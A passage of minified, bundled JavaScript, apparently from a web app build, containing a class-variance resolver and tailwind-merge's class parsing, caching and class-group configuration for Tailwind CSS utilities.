    if ((e == null ? void 0 : e.variants) == null)
        return ZS(r, t == null ? void 0 : t.class, t == null ? void 0 : t.className);
    const {variants: i, defaultVariants: n} = e
      , s = Object.keys(i).map(f => {
        const h = t == null ? void 0 : t[f]
          , p = n == null ? void 0 : n[f];
        if (h === null)
            return null;
        const b = KS(h) || KS(p);
        return i[f][b]
    }
    )
      , a = t && Object.entries(t).reduce( (f, h) => {
        let[p,b] = h;
        return b === void 0 || (f[p] = b),
        f
    }
    , {})
      , l = e == null || (o = e.compoundVariants) === null || o === void 0 ? void 0 : o.reduce( (f, h) => {
        let {class: p, className: b, ...v} = h;
        return Object.entries(v).every(T => {
            let[x,E] = T;
            return Array.isArray(E) ? E.includes({
                ...n,
                ...a
            }[x]) : {
                ...n,
                ...a
            }[x] === E
        }
        ) ? [...f, p, b] : f
    }
    , []);
    return ZS(r, s, l, t == null ? void 0 : t.class, t == null ? void 0 : t.className)
}
  , t3 = "-"
  , kj = r => {
    const e = $j(r)
      , {conflictingClassGroups: t, conflictingClassGroupModifiers: o} = r;
    return {
        getClassGroupId: s => {
            const a = s.split(t3);
            return a[0] === "" && a.length !== 1 && a.shift(),
            E9(a, e) || Lj(s)
        }
        ,
        getConflictingClassGroupIds: (s, a) => {
            const l = t[s] || [];
            return a && o[s] ? [...l, ...o[s]] : l
        }
    }
}
  , E9 = (r, e) => {
    var s;
    if (r.length === 0)
        return e.classGroupId;
    const t = r[0]
      , o = e.nextPart.get(t)
      , i = o ? E9(r.slice(1), o) : void 0;
    if (i)
        return i;
    if (e.validators.length === 0)
        return;
    const n = r.join(t3);
    return (s = e.validators.find( ({validator: a}) => a(n))) == null ? void 0 : s.classGroupId
}
  , YS = /^\[(.+)\]$/
  , Lj = r => {
    if (YS.test(r)) {
        const e = YS.exec(r)[1]
          , t = e == null ? void 0 : e.substring(0, e.indexOf(":"));
        if (t)
            return "arbitrary.." + t
    }
}
  , $j = r => {
    const {theme: e, classGroups: t} = r
      , o = {
        nextPart: new Map,
        validators: []
    };
    for (const i in t)
        gE(t[i], o, i, e);
    return o
}
  , gE = (r, e, t, o) => {
    r.forEach(i => {
        if (typeof i == "string") {
            const n = i === "" ? e : XS(e, i);
            n.classGroupId = t;
            return
        }
        if (typeof i == "function") {
            if (zj(i)) {
                gE(i(o), e, t, o);
                return
            }
            e.validators.push({
                validator: i,
                classGroupId: t
            });
            return
        }
        Object.entries(i).forEach( ([n,s]) => {
            gE(s, XS(e, n), t, o)
        }
        )
    }
    )
}
  , XS = (r, e) => {
    let t = r;
    return e.split(t3).forEach(o => {
        t.nextPart.has(o) || t.nextPart.set(o, {
            nextPart: new Map,
            validators: []
        }),
        t = t.nextPart.get(o)
    }
    ),
    t
}
  , zj = r => r.isThemeGetter
  , jj = r => {
    if (r < 1)
        return {
            get: () => {}
            ,
            set: () => {}
        };
    let e = 0
      , t = new Map
      , o = new Map;
    const i = (n, s) => {
        t.set(n, s),
        e++,
        e > r && (e = 0,
        o = t,
        t = new Map)
    }
    ;
    return {
        get(n) {
            let s = t.get(n);
            if (s !== void 0)
                return s;
            if ((s = o.get(n)) !== void 0)
                return i(n, s),
                s
        },
        set(n, s) {
            t.has(n) ? t.set(n, s) : i(n, s)
        }
    }
}
  , yE = "!"
  , bE = ":"
  , qj = bE.length
  , Vj = r => {
    const {prefix: e, experimentalParseClassName: t} = r;
    let o = i => {
        const n = [];
        let s = 0, a = 0, l = 0, f;
        for (let T = 0; T < i.length; T++) {
            let x = i[T];
            if (s === 0 && a === 0) {
                if (x === bE) {
                    n.push(i.slice(l, T)),
                    l = T + qj;
                    continue
                }
                if (x === "/") {
                    f = T;
                    continue
                }
            }
            x === "[" ? s++ : x === "]" ? s-- : x === "(" ? a++ : x === ")" && a--
        }
        const h = n.length === 0 ? i : i.substring(l)
          , p = Hj(h)
          , b = p !== h
          , v = f && f > l ? f - l : void 0;
        return {
            modifiers: n,
            hasImportantModifier: b,
            baseClassName: p,
            maybePostfixModifierPosition: v
        }
    }
    ;
    if (e) {
        const i = e + bE
          , n = o;
        o = s => s.startsWith(i) ? n(s.substring(i.length)) : {
            isExternal: !0,
            modifiers: [],
            hasImportantModifier: !1,
            baseClassName: s,
            maybePostfixModifierPosition: void 0
        }
    }
    if (t) {
        const i = o;
        o = n => t({
            className: n,
            parseClassName: i
        })
    }
    return o
}
  , Hj = r => r.endsWith(yE) ? r.substring(0, r.length - 1) : r.startsWith(yE) ? r.substring(1) : r
  , Gj = r => {
    const e = Object.fromEntries(r.orderSensitiveModifiers.map(o => [o, !0]));
    return o => {
        if (o.length <= 1)
            return o;
        const i = [];
        let n = [];
        return o.forEach(s => {
            s[0] === "[" || e[s] ? (i.push(...n.sort(), s),
            n = []) : n.push(s)
        }
        ),
        i.push(...n.sort()),
        i
    }
}
  , Kj = r => ({
    cache: jj(r.cacheSize),
    parseClassName: Vj(r),
    sortModifiers: Gj(r),
    ...kj(r)
})
  , Zj = /\s+/
  , Yj = (r, e) => {
    const {parseClassName: t, getClassGroupId: o, getConflictingClassGroupIds: i, sortModifiers: n} = e
      , s = []
      , a = r.trim().split(Zj);
    let l = "";
    for (let f = a.length - 1; f >= 0; f -= 1) {
        const h = a[f]
          , {isExternal: p, modifiers: b, hasImportantModifier: v, baseClassName: T, maybePostfixModifierPosition: x} = t(h);
        if (p) {
            l = h + (l.length > 0 ? " " + l : l);
            continue
        }
        let E = !!x
          , B = o(E ? T.substring(0, x) : T);
        if (!B) {
            if (!E) {
                l = h + (l.length > 0 ? " " + l : l);
                continue
            }
            if (B = o(T),
            !B) {
                l = h + (l.length > 0 ? " " + l : l);
                continue
            }
            E = !1
        }
        const P = n(b).join(":")
          , O = v ? P + yE : P
          , F = O + B;
        if (s.includes(F))
            continue;
        s.push(F);
        const D = i(B, E);
        for (let I = 0; I < D.length; ++I) {
            const M = D[I];
            s.push(O + M)
        }
        l = h + (l.length > 0 ? " " + l : l)
    }
    return l
}
;
function Xj() {
    let r = 0, e, t, o = "";
    for (; r < arguments.length; )
        (e = arguments[r++]) && (t = A9(e)) && (o && (o += " "),
        o += t);
    return o
}
const A9 = r => {
    if (typeof r == "string")
        return r;
    let e, t = "";
    for (let o = 0; o < r.length; o++)
        r[o] && (e = A9(r[o])) && (t && (t += " "),
        t += e);
    return t
}
;
function Jj(r, ...e) {
    let t, o, i, n = s;
    function s(l) {
        const f = e.reduce( (h, p) => p(h), r());
        return t = Kj(f),
        o = t.cache.get,
        i = t.cache.set,
        n = a,
        a(l)
    }
    function a(l) {
        const f = o(l);
        if (f)
            return f;
        const h = Yj(l, t);
        return i(l, h),
        h
    }
    return function() {
        return n(Xj.apply(null, arguments))
    }
}
const gn = r => {
    const e = t => t[r] || [];
    return e.isThemeGetter = !0,
    e
}
  , P9 = /^\[(?:(\w[\w-]*):)?(.+)\]$/i
  , C9 = /^\((?:(\w[\w-]*):)?(.+)\)$/i
  , Qj = /^\d+\/\d+$/
  , eq = /^(\d+(\.\d+)?)?(xs|sm|md|lg|xl)$/
  , tq = /\d+(%|px|r?em|[sdl]?v([hwib]|min|max)|pt|pc|in|cm|mm|cap|ch|ex|r?lh|cq(w|h|i|b|min|max))|\b(calc|min|max|clamp)\(.+\)|^0$/
  , rq = /^(rgba?|hsla?|hwb|(ok)?(lab|lch))\(.+\)$/
  , nq = /^(inset_)?-?((\d+)?\.?(\d+)[a-z]+|0)_-?((\d+)?\.?(\d+)[a-z]+|0)/
  , oq = /^(url|image|image-set|cross-fade|element|(repeating-)?(linear|radial|conic)-gradient)\(.+\)$/
  , hf = r => Qj.test(r)
  , Zt = r => !!r && !Number.isNaN(Number(r))
  , bc = r => !!r && Number.isInteger(Number(r))
  , Uv = r => r.endsWith("%") && Zt(r.slice(0, -1))
  , ga = r => eq.test(r)
  , iq = () => !0
  , sq = r => tq.test(r) && !rq.test(r)
  , S9 = () => !1
  , aq = r => nq.test(r)
  , cq = r => oq.test(r)
  , lq = r => !dt(r) && !ht(r)
  , uq = r => qd(r, I9, S9)
  , dt = r => P9.test(r)
  , wl = r => qd(r, O9, sq)
  , kv = r => qd(r, gq, Zt)
  , JS = r => qd(r, B9, S9)
  , fq = r => qd(r, _9, cq)
  , Yg = r => qd(r, R9, aq)
  , ht = r => C9.test(r)
  , sp = r => Vd(r, O9)
  , dq = r => Vd(r, yq)
  , QS = r => Vd(r, B9)
  , hq = r => Vd(r, I9)
  , pq = r => Vd(r, _9)
  , Xg = r => Vd(r, R9, !0)
  , qd = (r, e, t) => {
    const o = P9.exec(r);
    return o ? o[1] ? e(o[1]) : t(o[2]) : !1
}
  , Vd = (r, e, t=!1) => {
    const o = C9.exec(r);
    return o ? o[1] ? e(o[1]) : t : !1
}
  , B9 = r => r === "position" || r === "percentage"
  , _9 = r => r === "image" || r === "url"
  , I9 = r => r === "length" || r === "size" || r === "bg-size"
  , O9 = r => r === "length"
  , gq = r => r === "number"
  , yq = r => r === "family-name"
  , R9 = r => r === "shadow"
  , bq = () => {
    const r = gn("color")
      , e = gn("font")
      , t = gn("text")
      , o = gn("font-weight")
      , i = gn("tracking")
      , n = gn("leading")
      , s = gn("breakpoint")
      , a = gn("container")
      , l = gn("spacing")
      , f = gn("radius")
      , h = gn("shadow")
      , p = gn("inset-shadow")
      , b = gn("text-shadow")
      , v = gn("drop-shadow")
      , T = gn("blur")
      , x = gn("perspective")
      , E = gn("aspect")
      , B = gn("ease")
      , P = gn("animate")
      , O = () => ["auto", "avoid", "all", "avoid-page", "page", "left", "right", "column"]
      , F = () => ["center", "top", "bottom", "left", "right", "top-left", "left-top", "top-right", "right-top", "bottom-right", "right-bottom", "bottom-left", "left-bottom"]
      , D = () => [...F(), ht, dt]
      , I = () => ["auto", "hidden", "clip", "visible", "scroll"]
      , M = () => ["auto", "contain", "none"]
      , C = () => [ht, dt, l]
      , W = () => [hf, "full", "auto", ...C()]
      , k = () => [bc, "none", "subgrid", ht, dt]
      , H = () => ["auto", {
        span: ["full", bc, ht, dt]
    }, bc, ht, dt]
      , X = () => [bc, "auto", ht, dt]
      , Y = () => ["auto", "min", "max", "fr", ht, dt]
      , V = () => ["start", "end", "center", "between", "around", "evenly", "stretch", "baseline", "center-safe", "end-safe"]
      , R = () => ["start", "end", "center", "stretch", "center-safe", "end-safe"]
      , _ = () => ["auto", ...C()]
      , $ = () => [hf, "auto", "full", "dvw", "dvh", "lvw", "lvh", "svw", "svh", "min", "max", "fit", ...C()]
      , z = () => [r, ht, dt]
      , K = () => [...F(), QS, JS, {
        position: [ht, dt]
    }]
      , j = () => ["no-repeat", {
        repeat: ["", "x", "y", "space", "round"]
    }]
      , ee = () => ["auto", "cover", "contain", hq, uq, {
        size: [ht, dt]
    }]
      , ie = () => [Uv, sp, wl]
      , ae = () => ["", "none", "full", f, ht, dt]
      , he = () => ["", Zt, sp, wl]
      , me = () => ["solid", "dashed", "dotted", "double"]
      , Pe = () => ["normal", "multiply", "screen", "overlay", "darken", "lighten", "color-dodge", "color-burn", "hard-light", "soft-light", "difference", "exclusion", "hue", "saturation", "color", "luminosity"]
      , _e = () => [Zt, Uv, QS, JS]
      , Fe = () => ["", "none", T, ht, dt]
      , Je = () => ["none", Zt, ht, dt]
      , rt = () => ["none", Zt, ht, dt]
      , xt = () => [Zt, ht, dt]
      , Tt = () => [hf, "full", ...C()];
    return {
        cacheSize: 500,
        theme: {
            animate: ["spin", "ping", "pulse", "bounce"],
            aspect: ["video"],
            blur: [ga],
            breakpoint: [ga],
            color: [iq],
            container: [ga],
            "drop-shadow": [ga],
            ease: ["in", "out", "in-out"],
            font: [lq],
            "font-weight": ["thin", "extralight", "light", "normal", "medium", "semibold", "bold", "extrabold", "black"],
            "inset-shadow": [ga],
            leading: ["none", "tight", "snug", "normal", "relaxed", "loose"],
            perspective: ["dramatic", "near", "normal", "midrange", "distant", "none"],
            radius: [ga],
            shadow: [ga],
            spacing: ["px", Zt],
            text: [ga],
            "text-shadow": [ga],
            tracking: ["tighter", "tight", "normal", "wide", "wider", "widest"]
        },
        classGroups: {
            aspect: [{
                aspect: ["auto", "square", hf, dt, ht, E]
            }],
            container: ["container"],
            columns: [{
                columns: [Zt, dt, ht, a]
            }],
            "break-after": [{
                "break-after": O()
            }],
            "break-before": [{
                "break-before": O()
            }],
            "break-inside": [{
                "break-inside": ["auto", "avoid", "avoid-page", "avoid-column"]
            }],
            "box-decoration": [{
                "box-decoration": ["slice", "clone"]
            }],
            box: [{
                box: ["border", "content"]
            }],
            display: ["block", "inline-block", "inline", "flex", "inline-flex", "table", "inline-table", "table-caption", "table-cell", "table-column", "table-column-group", "table-footer-group", "table-header-group", "table-row-group", "table-row", "flow-root", "grid", "inline-grid", "contents", "list-item", "hidden"],
            sr: ["sr-only", "not-sr-only"],
            float: [{
                float: ["right", "left", "none", "start", "end"]
            }],
            clear: [{
                clear: ["left", "right", "both", "none", "start", "end"]
            }],
            isolation: ["isolate", "isolation-auto"],
            "object-fit": [{
                object: ["contain", "cover", "fill", "none", "scale-down"]
            }],
            "object-position": [{
                object: D()
            }],
            overflow: [{
                overflow: I()
            }],
            "overflow-x": [{
                "overflow-x": I()
            }],
            "overflow-y": [{
                "overflow-y": I()
            }],
            overscroll: [{
                overscroll: M()
            }],
            "overscroll-x": [{
                "overscroll-x": M()
            }],
            "overscroll-y": [{
                "overscroll-y": M()
            }],
            position: ["static", "fixed", "absolute", "relative", "sticky"],
            inset: [{
                inset: W()
            }],
            "inset-x": [{
                "inset-x": W()
            }],
            "inset-y": [{
                "inset-y": W()
            }],
            start: [{
                start: W()
            }],
            end: [{
                end: W()
            }],
            top: [{
                top: W()
            }],
            right: [{
                right: W()
            }],
            bottom: [{
                bottom: W()
            }],
            left: [{
                left: W()
            }],
            visibility: ["visible", "invisible", "collapse"],
            z: [{
                z: [bc, "auto", ht, dt]
            }],
            basis: [{
                basis: [hf, "full", "auto", a, ...C()]
            }],
            "flex-direction": [{
                flex: ["row", "row-reverse", "col", "col-reverse"]
            }],
            "flex-wrap": [{
                flex: ["nowrap", "wrap", "wrap-reverse"]
            }],
            flex: [{
                flex: [Zt, hf, "auto", "initial", "none", dt]
            }],
            grow: [{
                grow: ["", Zt, ht, dt]
            }],
            shrink: [{
                shrink: ["", Zt, ht, dt]
            }],
            order: [{
                order: [bc, "first", "last", "none", ht, dt]
            }],
            "grid-cols": [{
                "grid-cols": k()
            }],
            "col-start-end": [{
                col: H()
            }],
            "col-start": [{
                "col-start": X()
            }],
            "col-end": [{
                "col-end": X()
            }],
            "grid-rows": [{
                "grid-rows": k()
            }],
            "row-start-end": [{
                row: H()
            }],
            "row-start": [{
                "row-start": X()
            }],
            "row-end": [{
                "row-end": X()
            }],
            "grid-flow": [{
                "grid-flow": ["row", "col", "dense", "row-dense", "col-dense"]
            }],
            "auto-cols": [{
                "auto-cols": Y()
            }],
            "auto-rows": [{
                "auto-rows": Y()
            }],
            gap: [{
                gap: C()
            }],
            "gap-x": [{
                "gap-x": C()
            }],
            "gap-y": [{
                "gap-y": C()
            }],
            "justify-content": [{
                justify: [...V(), "normal"]
            }],
            "justify-items": [{
                "justify-items": [...R(), "normal"]
            }],
            "justify-self": [{
                "justify-self": ["auto", ...R()]
            }],
            "align-content": [{
                content: ["normal", ...V()]
            }],
            "align-items": [{
                items: [...R(), {
                    baseline: ["", "last"]
                }]
            }],
            "align-self": [{
                self: ["auto", ...R(), {
                    baseline: ["", "last"]
                }]
            }],
            "place-content": [{
                "place-content": V()
            }],
            "place-items": [{
                "place-items": [...R(), "baseline"]
            }],
            "place-self": [{
                "place-self": ["auto", ...R()]
            }],
            p: [{
                p: C()
            }],
            px: [{
                px: C()
            }],
            py: [{
                py: C()
            }],
            ps: [{
                ps: C()
            }],
            pe: [{
                pe: C()
            }],
            pt: [{
                pt: C()
            }],
            pr: [{
                pr: C()
            }],
            pb: [{
                pb: C()
            }],
            pl: [{
                pl: C()
            }],
            m: [{
                m: _()
            }],
            mx: [{
                mx: _()
            }],
            my: [{
                my: _()
            }],
            ms: [{
                ms: _()
            }],
            me: [{
                me: _()
            }],
            mt: [{
                mt: _()
            }],
            mr: [{
                mr: _()
            }],
            mb: [{
                mb: _()
            }],
            ml: [{
                ml: _()
            }],
            "space-x": [{
                "space-x": C()
            }],
            "space-x-reverse": ["space-x-reverse"],
            "space-y": [{
                "space-y": C()
            }],
            "space-y-reverse": ["space-y-reverse"],
            size: [{
                size: $()
            }],
            w: [{
                w: [a, "screen", ...$()]
            }],
            "min-w": [{
                "min-w": [a, "screen", "none", ...$()]
            }],
            "max-w": [{
                "max-w": [a, "screen", "none", "prose", {
                    screen: [s]
                }, ...$()]
            }],
            h: [{
                h: ["screen", "lh", ...$()]
            }],
            "min-h": [{
                "min-h": ["screen", "lh", "none", ...$()]
            }],
            "max-h": [{
                "max-h": ["screen", "lh", ...$()]
            }],
            "font-size": [{
                text: ["base", t, sp, wl]
            }],
            "font-smoothing": ["antialiased", "subpixel-antialiased"],
            "font-style": ["italic", "not-italic"],
            "font-weight": [{
                font: [o, ht, kv]
            }],
            "font-stretch": [{
                "font-stretch": ["ultra-condensed", "extra-condensed", "condensed", "semi-condensed", "normal", "semi-expanded", "expanded", "extra-expanded", "ultra-expanded", Uv, dt]
            }],
            "font-family": [{
                font: [dq, dt, e]
            }],
            "fvn-normal": ["normal-nums"],
            "fvn-ordinal": ["ordinal"],
            "fvn-slashed-zero": ["slashed-zero"],
            "fvn-figure": ["lining-nums", "oldstyle-nums"],
            "fvn-spacing": ["proportional-nums", "tabular-nums"],
            "fvn-fraction": ["diagonal-fractions", "stacked-fractions"],
            tracking: [{
                tracking: [i, ht, dt]
            }],
            "line-clamp": [{
                "line-clamp": [Zt, "none", ht, kv]
            }],
            leading: [{
                leading: [n, ...C()]
            }],
            "list-image": [{
                "list-image": ["none", ht, dt]
            }],
            "list-style-position": [{
                list: ["inside", "outside"]
            }],
            "list-style-type": [{
                list: ["disc", "decimal", "none", ht, dt]
            }],
            "text-alignment": [{
                text: ["left", "center", "right", "justify", "start", "end"]
            }],
            "placeholder-color": [{
                placeholder: z()
            }],
            "text-color": [{
                text: z()
            }],
            "text-decoration": ["underline", "overline", "line-through", "no-underline"],
            "text-decoration-style": [{
                decoration: [...me(), "wavy"]
            }],
            "text-decoration-thickness": [{
                decoration: [Zt, "from-font", "auto", ht, wl]
            }],
            "text-decoration-color": [{
                decoration: z()
            }],
            "underline-offset": [{
                "underline-offset": [Zt, "auto", ht, dt]
            }],
            "text-transform": ["uppercase", "lowercase", "capitalize", "normal-case"],
            "text-overflow": ["truncate", "text-ellipsis", "text-clip"],
            "text-wrap": [{
                text: ["wrap", "nowrap", "balance", "pretty"]
            }],
            indent: [{
                indent: C()
            }],
            "vertical-align": [{
                align: ["baseline", "top", "middle", "bottom", "text-top", "text-bottom", "sub", "super", ht, dt]
            }],
            whitespace: [{
                whitespace: ["normal", "nowrap", "pre", "pre-line", "pre-wrap", "break-spaces"]
            }],
            break: [{
                break: ["normal", "words", "all", "keep"]
            }],
            wrap: [{
                wrap: ["break-word", "anywhere", "normal"]
            }],
            hyphens: [{
                hyphens: ["none", "manual", "auto"]
            }],
            content: [{
                content: ["none", ht, dt]
            }],
            "bg-attachment": [{
                bg: ["fixed", "local", "scroll"]
            }],
            "bg-clip": [{
                "bg-clip": ["border", "padding", "content", "text"]
            }],
            "bg-origin": [{
                "bg-origin": ["border", "padding", "content"]
            }],
            "bg-position": [{
                bg: K()
            }],
            "bg-repeat": [{
                bg: j()
            }],
            "bg-size": [{
                bg: ee()
            }],
            "bg-image": [{
                bg: ["none", {
                    linear: [{
                        to: ["t", "tr", "r", "br", "b", "bl", "l", "tl"]
                    }, bc, ht, dt],
                    radial: ["", ht, dt],
                    conic: [bc, ht, dt]
                }, pq, fq]
            }],
            "bg-color": [{
                bg: z()
            }],
            "gradient-from-pos": [{
                from: ie()
            }],
            "gradient-via-pos": [{
                via: ie()
            }],
            "gradient-to-pos": [{
                to: ie()
            }],
            "gradient-from": [{
                from: z()
            }],
            "gradient-via": [{
                via: z()
            }],
            "gradient-to": [{
                to: z()
            }],
            rounded: [{
                rounded: ae()
            }],
            "rounded-s": [{
                "rounded-s": ae()
            }],
            "rounded-e": [{
                "rounded-e": ae()
            }],
            "rounded-t": [{
                "rounded-t": ae()
            }],
            "rounded-r": [{
                "rounded-r": ae()
            }],
            "rounded-b": [{
                "rounded-b": ae()
            }],
            "rounded-l": [{
                "rounded-l": ae()
            }],
            "rounded-ss": [{
                "rounded-ss": ae()
            }],
            "rounded-se": [{
                "rounded-se": ae()
            }],
            "rounded-ee": [{
                "rounded-ee": ae()
            }],
            "rounded-es": [{
                "rounded-es": ae()
            }],
            "rounded-tl": [{
                "rounded-tl": ae()
            }],
            "rounded-tr": [{
                "rounded-tr": ae()
            }],
            "rounded-br": [{
                "rounded-br": ae()
            }],
            "rounded-bl": [{
                "rounded-bl": ae()
            }],
            "border-w": [{
                border: he()
            }],
            "border-w-x": [{
                "border-x": he()
            }],
            "border-w-y": [{
                "border-y": he()
            }],
            "border-w-s": [{
                "border-s": he()
            }],
            "border-w-e": [{
                "border-e": he()
            }],
            "border-w-t": [{
                "border-t": he()
            }],
            "border-w-r": [{
                "border-r": he()
            }],
            "border-w-b": [{
                "border-b": he()
            }],
            "border-w-l": [{
                "border-l": he()
            }],
            "divide-x": [{
                "divide-x": he()
            }],
            "divide-x-reverse": ["divide-x-reverse"],
            "divide-y": [{
                "divide-y": he()
            }],
            "divide-y-reverse": ["divide-y-reverse"],
            "border-style": [{
                border: [...me(), "hidden", "none"]
            }],
            "divide-style": [{
                divide: [...me(), "hidden", "none"]
            }],
            "border-color": [{
                border: z()
            }],
            "border-color-x": [{
                "border-x": z()
            }],
            "border-color-y": [{
                "border-y": z()
            }],
            "border-color-s": [{
                "border-s": z()
            }],
            "border-color-e": [{
                "border-e": z()
            }],
            "border-color-t": [{
                "border-t": z()
            }],
            "border-color-r": [{
                "border-r": z()
            }],
            "border-color-b": [{
                "border-b": z()
            }],
            "border-color-l": [{
                "border-l": z()
            }],
            "divide-color": [{
                divide: z()
            }],
            "outline-style": [{
                outline: [...me(), "none", "hidden"]
            }],
            "outline-offset": [{
                "outline-offset": [Zt, ht, dt]
            }],
            "outline-w": [{
                outline: ["", Zt, sp, wl]
            }],
            "outline-color": [{
                outline: z()
            }],
            shadow: [{
                shadow: ["", "none", h, Xg, Yg]
            }],
            "shadow-color": [{
                shadow: z()
            }],
            "inset-shadow": [{
                "inset-shadow": ["none", p, Xg, Yg]
            }],
            "inset-shadow-color": [{
                "inset-shadow": z()
            }],
            "ring-w": [{
                ring: he()
            }],
            "ring-w-inset": ["ring-inset"],
            "ring-color": [{
                ring: z()
            }],
            "ring-offset-w": [{
                "ring-offset": [Zt, wl]
            }],
            "ring-offset-color": [{
                "ring-offset": z()
            }],
            "inset-ring-w": [{
                "inset-ring": he()
            }],
            "inset-ring-color": [{
                "inset-ring": z()
            }],
            "text-shadow": [{
                "text-shadow": ["none", b, Xg, Yg]
            }],
            "text-shadow-color": [{
                "text-shadow": z()
            }],
            opacity: [{
                opacity: [Zt, ht, dt]
            }],
            "mix-blend": [{
                "mix-blend": [...Pe(), "plus-darker", "plus-lighter"]
            }],
            "bg-blend": [{
                "bg-blend": Pe()
            }],
            "mask-clip": [{
                "mask-clip": ["border", "padding", "content", "fill", "stroke", "view"]
            }, "mask-no-clip"],
            "mask-composite": [{
                mask: ["add", "subtract", "intersect", "exclude"]
            }],
            "mask-image-linear-pos": [{
                "mask-linear": [Zt]
            }],
            "mask-image-linear-from-pos": [{
                "mask-linear-from": _e()
            }],
            "mask-image-linear-to-pos": [{
                "mask-linear-to": _e()
            }],
            "mask-image-linear-from-color": [{
                "mask-linear-from": z()
            }],
            "mask-image-linear-to-color": [{
                "mask-linear-to": z()
            }],
            "mask-image-t-from-pos": [{
                "mask-t-from": _e()
            }],
            "mask-image-t-to-pos": [{
                "mask-t-to": _e()
            }],
            "mask-image-t-from-color": [{
                "mask-t-from": z()
            }],
            "mask-image-t-to-color": [{
                "mask-t-to": z()
            }],
            "mask-image-r-from-pos": [{
                "mask-r-from": _e()
            }],
            "mask-image-r-to-pos": [{
                "mask-r-to": _e()
            }],
            "mask-image-r-from-color": [{
                "mask-r-from": z()
            }],
            "mask-image-r-to-color": [{
                "mask-r-to": z()
            }],
            "mask-image-b-from-pos": [{
                "mask-b-from": _e()
            }],
            "mask-image-b-to-pos": [{
                "mask-b-to": _e()
            }],
            "mask-image-b-from-color": [{
                "mask-b-from": z()
            }],
            "mask-image-b-to-color": [{
                "mask-b-to": z()
            }],
            "mask-image-l-from-pos": [{
                "mask-l-from": _e()
            }],
            "mask-image-l-to-pos": [{
                "mask-l-to": _e()
            }],
            "mask-image-l-from-color": [{
                "mask-l-from": z()
            }],
            "mask-image-l-to-color": [{
                "mask-l-to": z()
            }],
            "mask-image-x-from-pos": [{
                "mask-x-from": _e()
            }],
            "mask-image-x-to-pos": [{
                "mask-x-to": _e()
            }],
            "mask-image-x-from-color": [{
                "mask-x-from": z()
            }],
            "mask-image-x-to-color": [{
                "mask-x-to": z()
            }],
            "mask-image-y-from-pos": [{
                "mask-y-from": _e()
            }],
            "mask-image-y-to-pos": [{
                "mask-y-to": _e()
            }],
            "mask-image-y-from-color": [{
                "mask-y-from": z()
            }],
            "mask-image-y-to-color": [{
                "mask-y-to": z()
            }],
            "mask-image-radial": [{
                "mask-radial": [ht, dt]
            }],
            "mask-image-radial-from-pos": [{
                "mask-radial-from": _e()
            }],
            "mask-image-radial-to-pos": [{
                "mask-radial-to": _e()
            }],
            "mask-image-radial-from-color": [{
                "mask-radial-from": z()
            }],
            "mask-image-radial-to-color": [{
                "mask-radial-to": z()
            }],
            "mask-image-radial-shape": [{
                "mask-radial": ["circle", "ellipse"]
            }],
            "mask-image-radial-size": [{
                "mask-radial": [{
                    closest: ["side", "corner"],
                    farthest: ["side", "corner"]
                }]
            }],
            "mask-image-radial-pos": [{
                "mask-radial-at": F()
            }],
            "mask-image-conic-pos": [{
                "mask-conic": [Zt]
            }],
            "mask-image-conic-from-pos": [{
                "mask-conic-from": _e()
            }],
            "mask-image-conic-to-pos": [{
                "mask-conic-to": _e()
            }],
            "mask-image-conic-from-color": [{
                "mask-conic-from": z()
            }],
            "mask-image-conic-to-color": [{
                "mask-conic-to": z()
            }],
            "mask-mode": [{
                mask: ["alpha", "luminance", "match"]
            }],
            "mask-origin": [{
                "mask-origin": ["border", "padding", "content", "fill", "stroke", "view"]
            }],
            "mask-position": [{
                mask: K()
            }],
            "mask-repeat": [{
                mask: j()
            }],
            "mask-size": [{
                mask: ee()
            }],
            "mask-type": [{
                "mask-type": ["alpha", "luminance"]
            }],
            "mask-image": [{
                mask: ["none", ht, dt]
            }],
            filter: [{
                filter: ["", "none", ht, dt]
            }],
            blur: [{
                blur: Fe()
            }],
            brightness: [{
                brightness: [Zt, ht, dt]
            }],
            contrast: [{
                contrast: [Zt, ht, dt]
            }],
            "drop-shadow": [{
                "drop-shadow": ["", "none", v, Xg, Yg]
            }],
            "drop-shadow-color": [{
                "drop-shadow": z()
            }],
            grayscale: [{
                grayscale: ["", Zt, ht, dt]
            }],
            "hue-rotate": [{
                "hue-rotate": [Zt, ht, dt]
            }],
            invert: [{
                invert: ["", Zt, ht, dt]
            }],
            saturate: [{
                saturate: [Zt, ht, dt]
            }],
            sepia: [{
                sepia: ["", Zt, ht, dt]
            }],
            "backdrop-filter": [{
                "backdrop-filter": ["", "none", ht, dt]
            }],
            "backdrop-blur": [{
                "backdrop-blur": Fe()
            }],
            "backdrop-brightness": [{
                "backdrop-brightness": [Zt, ht, dt]
            }],
            "backdrop-contrast": [{
                "backdrop-contrast": [Zt, ht, dt]
            }],
            "backdrop-grayscale": [{
                "backdrop-grayscale": ["", Zt, ht, dt]
            }],
            "backdrop-hue-rotate": [{
                "backdrop-hue-rotate": [Zt, ht, dt]
            }],
            "backdrop-invert": [{
                "backdrop-invert": ["", Zt, ht, dt]
            }],
            "backdrop-opacity": [{
                "backdrop-opacity": [Zt, ht, dt]
            }],
            "backdrop-saturate": [{
                "backdrop-saturate": [Zt, ht, dt]
            }],
            "backdrop-sepia": [{
                "backdrop-sepia": ["", Zt, ht, dt]
            }],
            "border-collapse": [{
                border: ["collapse", "separate"]
            }],
            "border-spacing": [{
                "border-spacing": C()
            }],
            "border-spacing-x": [{
                "border-spacing-x": C()
            }],
            "border-spacing-y": [{
                "border-spacing-y": C()
            }],
            "table-layout": [{
                table: ["auto", "fixed"]
            }],
            caption: [{
                caption: ["top", "bottom"]
            }],
            transition: [{
                transition: ["", "all", "colors", "opacity", "shadow", "transform", "none", ht, dt]
            }],
            "transition-behavior": [{
                transition: ["normal", "discrete"]
            }],
            duration: [{
                duration: [Zt, "initial", ht, dt]
            }],
            ease: [{
                ease: ["linear", "initial", B, ht, dt]
            }],
            delay: [{
                delay: [Zt, ht, dt]
            }],
            animate: [{
                animate: ["none", P, ht, dt]
            }],
            backface: [{
                backface: ["hidden", "visible"]
            }],
            perspective: [{
                perspective: [x, ht, dt]
            }],
            "perspective-origin": [{
                "perspective-origin": D()
            }],
            rotate: [{
                rotate: Je()
            }],
            "rotate-x": [{
                "rotate-x": Je()
            }],
            "rotate-y": [{
                "rotate-y": Je()
            }],
            "rotate-z": [{
                "rotate-z": Je()
            }],
            scale: [{
                scale: rt()
            }],
            "scale-x": [{
                "scale-x": rt()
            }],
            "scale-y": [{
                "scale-y": rt()
            }],
            "scale-z": [{
                "scale-z": rt()
            }],
            "scale-3d": ["scale-3d"],
            skew: [{
                skew: xt()
            }],
            "skew-x": [{
                "skew-x": xt()
            }],
            "skew-y": [{
                "skew-y": xt()
            }],
            transform: [{
